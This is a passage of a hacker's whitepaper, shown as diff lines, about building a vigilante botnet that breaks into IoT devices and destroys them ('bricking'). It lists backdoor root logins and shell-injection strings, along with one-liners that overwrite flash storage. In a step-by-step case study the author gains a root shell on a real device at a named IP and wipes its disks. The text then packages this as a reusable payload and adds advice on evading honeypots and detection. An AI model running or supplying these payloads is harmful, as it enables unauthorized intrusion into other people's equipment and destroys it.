+ 2018-06-22           260
+ 2018-06-23           129
+ 2018-06-24            52
+ 2018-06-25            39
+ 2018-06-26            84
+ 2018-06-27            28
+ 2018-06-28            29
+ 2018-06-29            17
+ 2018-06-30            26
+ 
+So not really too many devices on the Internet with that backdoor login 
+yet and the vast majority of them were in Taiwan. But sometimes the 
+reality of being an Internet janitor is that you just end up cleaning a 
+bit of dust instead of hitting a motherlode of dirt. 
+
+
+--[ 2.5 - Finding problem devices
+
+Much of being an Internet janitor boils down to knowing where the 
+problems are and what they are. There are obviously many things that can 
+be done and taken into account when collecting data. In this section 
+I'll discuss some common methods.
+
+
+--[ 2.5.1 - Listening
+    
+Collecting data is the first step in pinpointing problem neighborhoods on 
+the Internet, and one good way of doing so is to passively listen for 
+scan attempts against IPs that you control. Enough malware on the 
+Internet will scan promiscuously anything and everything. Given enough
+time (even just 2-3 days is enough if you have a few hundred well-
+distributed listeners) you'll be able to create a statistically 
+meaningful map of dirty subnets. 
+
+At its most basic your sensor could be one or a few VMs listening for 
+inbound scan traffic (probably best to just dump a pcap of everything 
+hitting your interfaces and then parse the information of interest into a 
+database). When you generate your 'heat map' of problem subnets it's of 
+course important to evaluate the unique number of source IPs rather 
+than a total number of scans. A single infected IP can easily carry out 
+hundreds of thousands of scan attempts in a day so counting each 
+connection attempt would significantly bias your subnet sample. It's also 
+important to flag subnets which don't seem to produce much (unique IP) 
+scan traffic as these clean networks are not going to be worthwhile 
+targets (and at worst they will host more honeypots than actual 
+vulnerable devices). There's also some value in creating listeners
+on your VM in order to verify full TCP SYN-ACK-ACK handshakes (as these 
+would be difficult to spoof).
+
+In my own project I had the advantage of having spent 1.5 years securing
+(and taking over) ISP networks and thereby controlling a large number 
+of routers around the world. Listening on these routers gave me excellent 
+visibility of what was happening around the Internet, and my map of the 
+net was reasonably precise 2016-2018. Hacked routers that have been 
+secured (for your own use) are a useful resource for anyone looking to 
+chart Internet vulnerabilities in real-time on a large scale.
+
+Even so just having a few VMs on a few different networks should give 
+you a good idea of significant problem areas and allow you to build a 
+basic map of the world (and this is what many whitehat security 
+researchers do). The main disadvantage of having fewer listeners
+is that passive mapping will take longer and you'll be slower to notice
+any changes in the landscape.
+
+
+--[ 2.5.2 - Active scanning (scan-back)
+  
+Knowing which networks are hosting problem devices is one thing, but 
+knowing what these vulnerable devices are is also equally important. In 
+my own botnet I went for a simple scan-back design. If a bot registered a 
+connection attempt from a particular IP (and this was only for full SYN-
+ACK-ACK TCP handshakes) it would then carry out a simple port scan of the 
+IP and record any banners or HTTP responses found on common ports. 
+Collecting such scan-back information has been very useful as it has 
+allowed me to pinpoint new vulnerabilities as soon as they've been 
+exploited in the wild. If the prevalence of a particular banner suddenly 
+goes up you can immediately determine what kind of device it is and 
+search for any newly published exploits. You might even be able to copy 
+the device's banners and emulate them in your own honeypots (which I'll 
+discuss in the next subsection). Once you develop an effective payload 
+for the new vulnerability your botnet already knows which subnets to 
+target (due to the passive listening and banner mapping) and so you can 
+very quickly and effectively pacify the infected networks.
+
+If you don't have hacked routers or other systems to scan from then one 
+potential alternative to mapping out remote hosts might be to simply 
+use something like Tor (and the 'torsocks' wrapper for Torifying regular
+TCP/IP applications) but you should read my cautionary notes about Tor
+in section 6 before doing that. Also be aware that Tor IPs are likely to 
+be filtered in parts of the world (most notably China). To my knowledge 
+there are no laws against scanning a host's banners (if there was then 
+Shodan would be the first to go) and so you might even consider just 
+using a VM for scanning back.
+
+
+--[ 2.5.3 - Honeypots
+
+The term 'Honeypot' can describe a wide range of different setups for
+collecting information about potential attacks and attackers, but in this
+context honeypots are basically emulated device interfaces which allow
+us to mimick a common device interface such as telnetd or a HTTP service.
+Just by searching the net for 'honeypot github' you can get a bunch of 
+examples of open source honeypot projects. If you've never used a 
+honeypot I recommend that you set one up on a VM and see what kind of 
+data you can get with it.
+
+Besides collecting information such as new 0-day payloads the honeypots
+are often useful for collecting newly discovered backdoor account logins. 
+Remember our case study in section 2.4 where we used a low privilege 
+account to crack the root backdoor login 'root/e10adc39'? As our botnet 
+starts scanning for additional devices there's always a risk that one of
+our bots will try to log into somebody else's honeypot and reveal the 
+newly cracked password to them. By running our own honeypots we may get 
+lucky ourselves in return, and sometimes the returns can be very good. 
+Case in point - while updating my dictionary list with the newly cracked 
+login 'root/e10adc39' I also added a few other logins which had recently 
+appeared in my telnet honeypots. These included two new root logins 
+('root/taZz@01' and 'root/tsgoingon'). Let's compare the unique IP:port 
+hits of our newly cracked login 'root/e10adc39' versus these two other 
+newcomers:
+
+ Date            root/e10adc39     root/taZz@01     root/tsgoingon
+ 
+ 2018-06-21             0                 0                 0
+ 2018-06-22           260             17943              3969
+ 2018-06-23           129              9120              4941
+ 2018-06-24            52              4910              1194
+ 2018-06-25            39              2703              1341
+ 2018-06-26            84              1850              1192
+ 2018-06-27            28               966               707
+ 2018-06-28            29               337               323
+ 2018-06-29            17               441               216
+ 2018-06-30            26               431               198
+
+It looks like our honeypot hit a small jackpot with these two logins!
+Just by running honeypots around the net we scored two interesting new
+backdoor logins for BusyBox devices. The 'root/taZz@01' devices seem to 
+be located in China only, and the 'root/tsgoingon' backdoor account seems 
+to be affecting XiongMai devices all over the world (I'm guessing someone 
+is running an exploit which overwrites the device's original passwd db 
+with a new one). Our generic BusyBox payload seems effective against all 
+of these so it made for a quick and trivial cleanup job.
+
+Bricking 52,000 devices in 9 days may not be much to write home about,
+but considering it was achieved with less than two minutes of actual 
+work makes the bang-for-buck ratio very attractive especially for a 
+semi-retired Internet janitor. On that note the 'root/tsgoingon' devices 
+are interesting. If I hadn't been one week away from shutting down my 
+last C2 (and completing my retirement) I would've perhaps investigated 
+the XiongMai attack dynamics a bit more to see exactly what's going on 
+with these devices. 
+
+Before we wrap up this section about honeypots we should also quickly 
+discuss honeypot avoidance. Obviously we want to do everything we can not
+to tip off blackhats and other adversaries about a new login or exploit,
+and so we should arm our scanners with some basic sense. The first and
+most obvious strategy is to rely on our passively collected map of the 
+Internet - NEVER connect to IPs on networks that aren't showing any 
+obvious signs of IoT malware on them! The other and perhaps equally 
+important step is to use some basic device fingerprinting - honeypots 
+usually allow arbitrary logins or produce inconsistent results when 
+requesting an index web page. Combining these two filters has generally 
+worked well for me, and although these won't give you perfect protection 
+against more devious honeypots (or DPI) you should still remember that 
+the odds of low-skilled blackhats (the typical adversary for an Internet 
+janitor) running elaborate hardware honeypots on dirty ISP networks is 
+rather low. In 2017 one of the consistent sources of humor for me was 
+listening to researchers stating that my botnet couldn't amount to much 
+since it never appeared in their honeypots (this is akin to hunters 
+stating that there are no bears since they're not stepping into their 
+poorly disguised backyard bear traps).
+
+
+--[ 2.5.4 - Other data sources
+
+If you're not willing to hack routers and build your own network scanning
+infrastructure there are some third party sources for mapping the 
+Internet. At least the following data sources may be a useful starting
+point:
+
+* Shodan.io: You can subscribe to their API stream and get a feed of 
+  400-500 banners per second collected from different IPs. This is
+  probably a good data source for building your own banner map of the 
+  Internet.
+
+* Censys.io: Similar as above, appears to give more data for free to 
+  researchers.
+
+* Zoomeye.org: Chinese cyberspace search engine, similar to the above.
+
+It would be possible to construct a relatively simple network cleaner 
+just by processing banner data collected from these APIs and pushing 
+suitable bricking payloads through Tor/torsocks (again, see section 6 
+for my cautionary note about using Tor before trying this). If you were
+to try this approach it would probably be a good idea to randomize the 
+time between collecting a banner through a service and running a 
+bricking attempt against the IP (correlation attacks ;)
+
+You should note that having a database of IP banner data is only part of
+the picture since the banners by themselves are usually not enough to 
+infer which devices and networks have actually been infected by botnets. 
+Sadly I can't recommend any specific third party source for such 
+inbound scan data (I've always preferred to use hacked routers for such
+listening) but it's worth asking around. You may also be able to combine
+some public listener data such as that of Twitter user @bad_packets 
+(which seems to be based on a very small listener network) into a 
+statistically significant enough dataset.
+
+
+--[ 3 - Workarounds
+
+Blackhats will often try to prevent you from hacking an IoT system 
+they're in control of (and are scanning you with). Taking over such 
+'defended' devices may require workarounds. Although I've discussed such
+common workarounds before I'll quickly summarize the main categories 
+here.
+
+
+--[ 3.1 - 'Telnet Killers'
+
+I've mentioned these before. A 'Telnet Killer' is basically an attempt
+by the malware process to terminate the telnetd service on the host (thus
+preventing anyone else from accessing the device via telnet). The idea is
+usually to kill the telnetd and then attempt to bind port 23 (or whatever
+the used telnet port is) to create a race condition preventing the OS 
+watchdog from restarting the telnetd process.
+
+Often these techniques actually work (in which case you may have to wait 
+for the device to reboot to get access) but with some devices and 
+firmwares these attempts to kill the telnetd never succeed in preventing
+the restart, and so the telnetd will be killed over and over again every
+second. You can easily detect such conditions by a telnetd letting
+you connect to it only to disconnect you after less than a second.
+
+In such scenarios it's necessary to push out your bricking payload 
+immediately after the password has been accepted. This is also one of 
+the primary reasons for why you shouldn't get too fancy with device 
+enumerations or any expected responses. As soon as you've fingerprinted 
+the device (and have a rough idea of what it is, possibly based on the 
+login user/password or banner) you must keep retrying to log into the 
+system, then blindly push your bricking payload and hope for the best. 
+
+This was a generally useful technique against Mirai in 2016 and 2017. 
+For successful circumvention of restarting telnetds it took on average 
+10 attempts (9.359 attempts against XiongMai telnetds, 9.594 attempts 
+against generic BusyBox telnetds, and 10.799 attempts against Faraday 
+telnetds) with an average of 450 ms of delay from sending the device 
+password to blindly pushing a payload (438 ms for generic BusyBox 
+telnetds, 431 ms for XiongMai and 471 ms for Faraday). 
+
+
+--[ 3.2 - Alternative Vectors
+
+If you identify a device which hosts malware without an obvious way to 
+disable it (for example the malware has successfully firewalled the 
+telnetd and sshd) it may be beneficial to look at other services running 
+on the device. Quite often IoT devices come with web interfaces which may 
+have weak default credentials (such as 'admin/admin' or 'admin/12345') 
+through which you can force a device factory reset, disable its 
+networking or simply reboot the device. Many of the HTTP payloads in my 
+leaked plaintext module were exactly designed for this backup plan 
+purpose.
+
+
+--[ 3.3 - The Best Workaround: Patience
+
+When a vulnerable device reboots and shows up on the Internet with a 
+clear configuration there are various actors competing to compromise it 
+before everyone else. Blackhats spend a considerable amount of time and
+resources on scanning precisely for this reason. If you've set up your
+own network listener on a publically routed IP you'll get a good feel for
+precisely how persistent such scanning is - every system connected to the 
+Internet will get scanned hundreds of times per day. Given such fierce 
+competition you might think that there's a low chance you could get to a
+vulnerable IoT device before the bad guys.
+
+Although the short-term odds are usually in favor of the blackhats the 
+reality of the IoT battlefield is that blackhats have to be successful 
+every single time while the janitor only needs to succeed once. Thus 
+the long-term odds tend to be in favor of the janitor. Set your temporal 
+expectation scale to weeks or months rather than hours or days. Remember
+that the decimation of the 2016 Mirai botnets required 3 months of hard
+grinding. But as long as you're in it for the long haul it doesn't matter 
+if you're able to brick a particular device right now or only in 30 days. 
+What's important is that you keep trying.
+
+Statistically your odds will also improve significantly if you treat
+all external scanning IPs (hosts that are trying to connect to your
+listeners) as hot leads - aggressively scanning IoT devices are 
+relatively volatile (even compared to other devices running off third 
+world power grids) and so the infected device is likely to reboot within 
+a matter of hours. If you're lucky the device will return online on the 
+same IP with re-exposed control interfaces (and even if it doesn't then
+you might get lucky with whatever device gets the dynamic IP next).  
+It pays to scan-back regularly.                                             
+
+For my own botnet design I opted to rescan all suspected hostile IPs 
+periodically with diminishing scan rates (for up to 16 hours). This 
+approach seemed generally effective especially when combined with 
+additional active scanning which targeted adjacent subnets.
+
+
+--[ 4 - Finding usable vulnerabilities
+
+Often times when we log into a new IoT device we won't find an 
+immediately useful method of bricking it. Perhaps the telnet/SSH CLI does
+not provide us a shell, or perhaps we're stuck using the web interface
+through which can't do much more than disable the device's networking. 
+Maybe we're simply stuck with a low-privilege account that's good enough
+for a botnet builder but not good enough for a janitorial intervention.
+In this section we'll discuss some ways of searching for vulnerabilities 
+in restricted IoT interfaces and our objective will be to escalate our 
+access privileges to an ability to run commands as a root user. 
+
+
+--[ 4.1 - Input sanitation
+
+In situations where we have inadequate access it's often a good idea to 
+poke around the CLI or web interface and look for beginner mistakes with 
+input sanitation. Often times device manufacturers wrap standard Unix 
+utilities such as 'ping' behind their interfaces and injecting shell 
+commands into these requests are usually the quickest way to find new 
+RCEs. 
+
+Some common ways of wrapping shell commands (such as 'reboot' or 'sh') in 
+an interface request are:
+
+* ;reboot; - Wrap the attempted command with the line separator 
+             metacharacter ;
+
+* `reboot` - Wrap the attempted command with command substitution 
+             character `
+             
+* $(reboot) - Alternative command substition wrapping form
+ 
+* &&reboot - Prefix the command with a control operator            
+
+Typical places to look for opportunities to wrap shell commands are:
+
+* ping/traceroute - Usually custom interfaces wrap these standard network 
+                    testing tools in some fashion. 
+                    
+* NTP - Any parameters to do with NTP settings may provide a path for 
+        injecting commands. The server name field is your first obvious
+        target of choice.
+        
+* Backups - Backup tools are often also wrapped shell scripts. Here 
+            arguments such as tftp target server names or file name
+            entry fields may provide an opportunity.
+            
+* Shell - Perhaps too obvious to mention, but sometimes interfaces 
+          (especially CLIs) offer an explicit or hidden command to evoke
+          a shell.
+          
+* DDNS - Dynamic DNS setting fields are also a common weakness.
+          
+* Other - Any place which accepts a custom URL or other string is
+          potentially exploitable, and it's worth testing them all.
+          It's not unusual for device makers to sanitize most commands 
+          (perhaps because they were part of a wrapped stack) yet 
+          somehow miss one (perhaps because it was a late customization).
+
+There are plenty of examples of such command injections in my leaked 
+plaintext module's payloads (for the web payloads search for string
+'%60' which translates to the ` character) and you can easily search 
+through them with the above common special characters for inspiration. 
+A few CLI examples are listed below:
+
+> ping ;sh
+  
+(Classic way of getting a shell on a device which performs no input
+ sanitation - the ping command gets passed on to the underlying OS with
+ a line separator character which then executes 'sh' for a shell)
+
+> tftp -p -t f -f `cat /dev/urandom >/dev/root` 127.0.0.1
+
+(Command substitution character in the filename parameter of a wrapped
+ tftp call, the substitution will be executed first)
+
+> tftp -p -f test ;route del default
+
+(Line separator in filename parameter of a wrapped tftp call)
+
+> traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&
+
+(Line separator followed by command. Space had to be substituted with
+ internal field separator sequence ${IFS} due to the CLI expecting a
+ single parameter only)
+
+> ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0;true
+
+(Here the ping wrapper requires both a valid parameter, line separators 
+ and a 'true' response to work)
+
+> util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&`
+  
+(Similar to above, but this time the RCE was found in a wrapped md5sum
+ utility)
+
+> logfile-upload
+  ftp://127.0.0.1/&&`dd${IFS}if=/dev/zero${IFS}of=/dev/mtdblock0${IFS}&`
+
+(Providing a tainted URL to a logfile upload script - since the wrapper
+ expects a single string and filters the ; character we're forced to 
+ prefix the command substition with &&)
+
+The classic equivalent for web interfaces is just to wrap an attempted
+command with %60 (the ` character urlencoded). If you send %60reboot%60 
+or `reboot` as your argument for wrapped ping, backup, NTP, DDNS etc. 
+functionality and the device stops responding then you have a potential 
+winner on your hands!
+
+
+--[ 4.2 - Hashes
+
+If you find that the account you're accessing the device with doesn't 
+have enough (i.e 'root') privileges for wiping the drives (but you still
+have shell access) it may be a good idea to cat the '/etc/passwd' and the 
+'/etc/shadow' contents and look for hashes belonging to accounts with
+elevated privileges. The /etc folder may also contain additional conf
+files with hashes for the web interface. Cracking the hashes for these 
+other accounts may yield backdoor account logins which you can later use 
+against other devices (see section 2.4's case study).
+
+An entire whitepaper could be written about strategies for harvesting 
+dictionary data for faster cracking of IoT device logins and for using
+the devices as springboards to break into ISP networks. It's beyond the 
+scope of this whitepaper to discuss the details of hash cracking (and as 
+it's a generally well-researched area there's already plenty of freely 
+available information online). You may remember how I in my Internet 
+Chemotherapy project's introduction wrote that my SSH payloads were 'too 
+dangerous to publish' and it admittedly sounded evasive, but this was
+the specific reason why: my SSH payloads were primarily designed to find 
+information that's useful for taking over an ISP's network and the device 
+bricking aspect was only a secondary concern. As such they're not 
+significantly relevant to a whitepaper about bricking vulnerable devices.
+When I retire out of the ISP-owning game perhaps there would be some 
+interest in a whitepaper about taking over ISP networks? (I promise 
+you'll love my case studies)
+
+
+--[ 4.3 - Third party tools / additional study materials
+
+I recommend getting acquainted with the following:
+
+* RouterSploit - This is a must-have reference tool for quickly checking 
+                 if a particular IoT device is vulnerable to any common
+                 popular exploits.
+                 
+* Fuzzers - Fuzzing basically automates the testing of malformed input
+            (parameters, protocols, etc). To my knowledge fuzzing is
+            relatively underappreciated as a method for testing IoT 
+            device interfaces and protocols (and I believe this is a
+            promising area of research). 
+
+* https://archive.openwrt.org/ - Many precompiled stripped down binaries 
+                                 of popular software packages for many
+                                 architectures. Can be unpacked manually 
+                                 and ran on typical router OSes (does not 
+                                 require OpenWRT). Quickest source for
+                                 programs like nmap and python for an
+                                 embedded device.
+
+
+--[ 4.4 - Case study: Finding a simple RCE and creating a payload
+
+In this section we'll find a new vulnerability in an IoT device, figure 
+out how to brick it, and create a payload for it. 
+
+Our study begins with our botnet finding a few devices on the Internet 
+which it couldn't fingerprint as a known device type:
+
+  CN 222.173.42.91:23 telnet root/admin
+  CN 222.173.42.93:23 telnet root/admin
+  CN 222.173.42.78:23 telnet root/admin
+
+So basically on a subnet in China there were some unidentified devices 
+with the login root/admin. Let's log into one of them and see what they 
+are:
+
+  # telnet 222.173.42.93
+
+  Entering character mode
+  Escape character is '^]'.
+
+  QL_LoadBalance login: root
+  Password: 
+  Last login: Tue Jun 26 13:20:47 UTC-8 2018 from 2.181.12.239 on pts/1
+
+  Welcome to Application Switch Supported by PIOLINK
+
+        Product Name            : PAS-K1016
+        Mgmt IP Address         : 1.1.1.1
+        Warranty License Expire : UNLIMITED
+
+  System Information as of Tue Jun 26 13:34:56 UTC-8 2018
+
+  QL_LoadBalance# 
+
+A quick search for PAS-K1016 indicates it's some kind of Chinese switch
+product. We'll type '?' to see if there's any help for the CLI:
+
+  QL_LoadBalance# 
+    arping               Arping command
+    cls                  Clean screen
+    configure            Configuration mode -->
+    help                 Get help
+    history              Print History
+    ping                 Send out echo message
+    ping6                Send out ipv6 echo message
+    quit                 Quit
+    show                 Show configuration
+    ssh                  SSH connected
+    tcpdump              Dump traffic on a network
+    telnet               Telnet connected
+    traceroute           Traceroute tracks
+  QL_LoadBalance# 
+
+It's clearly a custom CLI. It looks like there are a few basic commands 
+available to us and the likes of 'ping' could be dangerously wrapped. 
+Let's see if any of the basic control character filtering issues exist 
+with this command:
+
+  QL_LoadBalance# ping ;sh
+  Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
+              [-p pattern] [-s packetsize] [-t ttl] [-I interface]
+              [-M pmtudisc-hint] [-m mark] [-S sndbuf]
+              [-T tstamp-options] [-Q tos] [hop1 ...] destination
+  sh-4.2# 
+
+Comically the very first thing we tried gave us a root shell. The custom 
+CLI passes the ping arguments to an underlying OS without any kind of 
+input sanitation. Sadly this is a common mistake for IoT device makers
+who decide to roll their own CLIs.
+
+  sh-4.2# ps w
+    PID TTY      STAT   TIME COMMAND
+   2696 tty4     Ss+    0:00 /sbin/getty -8 38400 tty4
+   2698 tty5     Ss+    0:00 /sbin/getty -8 38400 tty5
+   2704 tty2     Ss+    0:00 /sbin/getty -8 38400 tty2
+   2706 tty3     Ss+    0:00 /sbin/getty -8 38400 tty3
+   2712 tty6     Ss+    0:00 /sbin/getty -8 38400 tty6
+   3351 ttyS1    Ss+    0:00 /sbin/getty -L 9600 tty_console vt102
+   3353 tty1     Ss+    0:00 /sbin/getty -8 38400 tty1
+  30066 pts/1    Ss     0:00 login -h 77.244.42.213 -p
+  30127 pts/1    S      0:00 sh /usr/bin/k2cli
+  30167 pts/1    S      0:00 /usr/share/k2/amss/bin/k2cli
+  30335 pts/1    S      0:00 sh -c ping ;sh
+  30337 pts/1    S      0:00 sh
+  30658 pts/1    R+     0:00 ps w
+
+We can see the dangerous 'ping' evocation in the 'ps' output. It appears
+that whatever is entered in the CLI after 'ping' gets blindly executed as
+sh -c ping <whatever>. On a positive note there appears to be no malware
+on the device so we may be getting first dibs on this RCE.
+
+Now, let's find out a bit more about the device so that we can write our
+bricking payload for it:
+
+  sh-4.2# cat /proc/mtd
+  cat: /proc/mtd: No such file or directory
+  
+Our first surprise of the day. There is no /proc/mtd. The OS might be 
+non-standard or then the device really doesn't have a flash drive. 
+
+  sh-4.2# cat /proc/partitions
+  major minor  #blocks  name
+
+     8        0   39082680 sda
+     8        1    1951744 sda1
+     8        2          1 sda2
+     8        5    1952752 sda5
+     8        6    1952752 sda6
+     8        7    1952752 sda7
+     8        8    1952752 sda8
+     8        9   29318128 sda9
+     
+Apparently this system has something which looks like an actual hard disk 
+(with 7 partitions) as its only drive. 
+     
+  sh-4.2# cat /proc/mounts
+  rootfs / rootfs rw 0 0
+  none /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+  none /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+  none /dev devtmpfs rw,relatime,size=1881804k,nr_inodes=470451,mode=755 0 0
+  none /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620 0 0
+  fusectl /sys/fs/fuse/connections fusectl rw,relatime 0 0
+  /dev/disk/by-label/k2-base-2 / ext4 rw,relatime,barrier=1,data=ordered 0 0
+  none /cgroups cgroup rw,relatime,memory 0 0
+  none /dev/shm tmpfs rw,nosuid,nodev,relatime 0 0
+  none /var/run tmpfs rw,nosuid,relatime,mode=755 0 0
+  none /var/lock tmpfs rw,nosuid,nodev,noexec,relatime 0 0
+  /dev/sda9 /opt/k2 ext4 rw,relatime,barrier=1,data=ordered 0 0
+  /dev/sda8 /opt/k2/conf ext4 rw,relatime,barrier=1,data=ordered 0 0
+  /dev/sda7 /system ext4 rw,relatime,barrier=1,data=ordered 0 0
+  LABEL=hugetlbfs /media/huge hugetlbfs rw,relatime 0 0
+  tmpfs /opt/nginx/proxy_temp tmpfs rw,relatime,size=65536k 0 0
+  tmpfs /var/run/pagespeed_cache_temp tmpfs rw,relatime,size=131072k 0 0
+
+The mounts also look a bit unusual for an IoT device. Since the device 
+was called QL_LoadBalance it may be some kind of reverse proxy for web
+use and it makes sense such a device would come with plenty of storage. 
+Here a blackhat would no doubt inspect the partition contents for 
+anything interesting, and a whitehat would get busy writing a token
+'tried to contact vendor' e-mail in preparation of the subsequent 
+prestige-boosting press release. Since we have no time for such 
+tomfoolery we'll simply check if we can brick the device:
+
+  sh-4.2# cat /dev/urandom >/dev/sda &
+  [1] 31154
+  sh-4.2# 
+
+Our attempt to write pseudo-random garbage over /dev/sda seems to be 
+doing something. Let's check if the device is still happy ten seconds
+later:
+
+  sh-4.2# cat /proc/version
+  Linux version 2.6.34-K2 (jenkins@chicken) (gcc version 4.5.2 
+  (Ubuntu/Linaro 4.5.2-8ubuntu4) ) #575 SMP Fri Dec 9 09:25:21 KST 2016
+
+The OS still seems to be responding and interestingly (again, a bit 
+unusually for an IoT device) it claims to be some kind of Ubuntu 
+derivative. The /dev/sda is a big drive and it's possible that our 
+/dev/sda wiping will take a while before it hits any OS-relevant parts.
+Since we're anxious to see results we'll test if writing /dev/urandom 
+output to the individual device partitions will speed up things:
+
+  sh-4.2# cat /dev/urandom >/dev/sda1 &
+  [2] 644
+  sh-4.2# cat /dev/urandom >/dev/sda2 &
+  [3] 667
+  sh-4.2# cat: write error: No space left on device
+  cat /dev/urandom >/dev/sda3 &
+  [4] 703
+  [3]   Done(1)                 cat /dev/urandom > /dev/sda2
+  sh-4.2# cat /dev/urandom >/dev/sda4 &
+  [5] 710
+  sh-4.2# cat /dev/urandom >/dev/sda5 &
+  [6] 731
+  sh-4.2# cat /dev/urandom >/dev/sda6 &
+  [7] 743
+  sh-4.2# cat /dev/urandom >/dev/sda7 &
+  [8] 765
+  sh-4.2# cat /dev/urandom >/dev/sda8 &
+  [9] 770
+  sh-4.2# cat /dev/urandom >/dev/sda9 &
+  [10] 800
+  sh-4.2# ps w
+  Segmentation fault
+  
+Mikey likes it! Getting a 'Segmentation fault' response when trying to 
+run 'ps' is a promising development. Clearly something is starting to 
+break in the running OS. Let's see if we still have a chance to nuke 
+the default routing:
+  
+  sh-4.2# route del default
+  sh: route: command not found
+  
+Oops. No segfault this time but instead a 'command not found.' The drive 
+mount may have broken and that makes it harder to kill what's still left 
+of the device. Let's see what's currently mounted:
+  
+  sh-4.2# 
+  
+The device has stopped responding to our typing which could signify a 
+terminal condition. We'll escape out of telnet and try reconnecting:
+  
+  # telnet 222.173.42.93
+  telnet: cannot connect to remote host (222.173.42.93): Connection timed 
+  out
+  # 
+
+Bingo! Although we weren't able to drop the default routing on the device
+the kernel seems to have given up on its own (guess that hard disk was 
+needed for something after all, huh?). Based on this research it looks 
+like we have a potentially viable payload for any future devices of this 
+kind. Let's formalize it:
+
+  [ 'paspiolink', '.*', 'Supported by PIOLINK',
+    'ping ;sh', '# ',
+    'cat /dev/urandom >/dev/sda &', '',
+    'cat /dev/urandom >/dev/sda1 &', '',
+    'cat /dev/urandom >/dev/sda2 &', '',
+    'cat /dev/urandom >/dev/sda3 &', '',
+    'cat /dev/urandom >/dev/sda4 &', '',
+    'cat /dev/urandom >/dev/sda5 &', '',
+    'cat /dev/urandom >/dev/sda6 &', '',
+    'cat /dev/urandom >/dev/sda7 &', '',
+    'cat /dev/urandom >/dev/sda8 &', '',
+    'cat /dev/urandom >/dev/sda9 &', '',
+    'route del default', '',
+  ],
+
+If you read through the mod_plaintext.py source module that I leaked back
+in December you'll probably recognize the layout. First there's a payload
+identifier tag (in this case we'll call it 'paspiolink' in order to 
+remind us what it was based on), then a regexp for matching the user/pass 
+(in this case we'll accept any user/pass), and then a regexp for matching 
+any strings seen in the telnet transaction.
+
+We'll use the 'Supported by PIOLINK' string as an identifier for this 
+device in the hopes that any other devices matching this string will
+behave similarly enough for the payload to work (but we should review
+any unexpected results in order to determine if the identifier requires
+narrowing down).
+
+The remaining elements in the payload array are just commands to execute
+and responses to wait for before continuing. Since we're not sure of how
+the CLI buffers its data we'll wait for a '# ' after the initial RCE
+is attempted, but the rest of the lines will then be pushed all at once
+as there's no need for us to process any subsequent responses. 
+
+It's important for us to review at least the initial hits for this
+payload to make sure it has worked as intended, but regardless of the
+outcome there's now at least one less dangerous device on the Internet.
+Hooray!
+
+
+--[ 5 - Notes about original payload module source
+
+I'm still hoping to be able to offer a better presentation of my original
+payloads but it's equally likely that the old mod_plaintext.py will 
+remain the only public reference. This is perhaps just as well since it 
+requires a bit of basic programming skill to understand what's in it and 
+how to make use of it. Ne puero gladium still applies.
+
+Since the module was obfuscated the following notes may be helpful for
+those who refer to it in the future:
+
+* Before processing any remote strings I'm carrying out a regex 
+  substitution to filter out control etc characters. I specifically
+  filter out anything matching [^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]
+  and this is why for example the _ character is missing in my payload
+  fingerprinting (I agree that the filtering is excessively strict, but
+  it works).
+
+* The biggest and strangest code blob in the obfuscated python code is
+  an ASCII captcha resolver (some Broadcom stacks use this silly 
+  protective measure). I designed it to be flexible enough to handle
+  potential font changes so that's why there is a separate mapping phase 
+  and a statistical interpretation phase. It's a basic OCR engine but 
+  in hindsight a simple string matcher would've done the job just as well
+  (since the Broadcom fonts and layout have remained unchanged for 1.5 
+  years).
+  
+* For the telnet payloads the array schema is:
+  [ <payload identifier>, <login regex match>, <connection fingerprinting
+    regex match>, <exec command 1>, <waifor regex 1>, <exec command 2>,
+    <waifor regex 2>, <exec command 3>, <waitfor regex 3>, etc ]
+
+* For web payloads the array schema is:
+  [ <payload identifier>, <regex match for first 1024 bytes of GET /
+    response>, <http request 1>, <http request 2>, <http request 3>,
+    etc ]
+
+* I've used some simple template tags such as %NEWPASS% as hooks for
+  generating dynamic content in the payloads. The purpose of the tags
+  should be self-explanatory.
+
+* There were a few payload bugs in my December release so you shouldn't 
+  blindly use them without double checking them. There have also been a
+  lot of new backdoor passwords since then (6 months is a very long time 
+  in the IoT hacking scene).
+
+
+--[ 6 - Simple DIY bricking bot
+
+We've already previously discussed some (perhaps obvious) ideas and 
+concepts for creating your own automated bricking bot but I'll quickly
+summarize the main points here and then focus on the OpSec aspects of
+your most likely initial approach.
+
+
+--[ 6.1 - Finding vulnerable hosts
+
+Obviously your bot needs to find something to target. If I were to start
+from scratch now I'd probably get a Shodan subscription as my first step
+(to speed up the mapping of the Internet and for building a database of
+device banners). You should of course be aware that what you're doing
+with the Shodan API is probably monitored by someone, so your best bet
+is to just start recording the real time banner stream and adding data 
+of interest to a database of your own. This way you can mine the data as 
+you see fit. You should also not react to a banner immediately 
+(correlation attack), but instead add at least some random time before 
+you run a scan or a test against a host displayed in Shodan's real time 
+stream.
+
+Getting a few VMs around the world and listening for incoming scan 
+traffic on their IPv4 and IPv6 interfaces is also an obvious source 
+of additional data. Large subnets with a lot of unique IPs participating
+in network scanning probably indicates some level of compromise and these
+subnets should be your top priority for network cleaning efforts. A 
+fusion of the Shodan banner data and the incoming scan data (and any 
+additional information that your honeypots may be able collect) should 
+give you a good starting point for understanding and tracking dangerous 
+devices.
+
+
+--[ 6.2 - Hacking back vulnerable hosts
+
+Unless you've built a network of hacked routers (or other hosts) that you 
+can use for active scanning and hacking then it might be tempting to use 
+something like Tor (and the torsocks wrapper) for carrying out operations 
+against dangerous devices. This actually also works. You should however
+be aware of a few points:
+
+* Keep in mind that many programs won't handle connection timeouts 
+  gracefully when hooked by torsocks so you should always run some kind 
+  of process watchdog that kills hung processes.
+  
+* Also keep in mind that there are some safety risks with using Tor. If
+  you plan on doing this then please read section 6.3 VERY CAREFULLY and
+  make sure you understand it before you decide to do anything.
+  
+* Remember that the Tor IPs can be filtered in parts of the world 
+  (particularly China) and this limits their usefulness to some degree.
+  You may be able to proxychain your way around such limitations though.
+
+
+--[ 6.3 - Safety notes about using Tor and torsocks
+
+Before you decide to use Tor for anything you should understand the risks
+associated with using it. I certainly don't claim to be aware of all of 
+them but I've also observed issues which don't seem to be common 
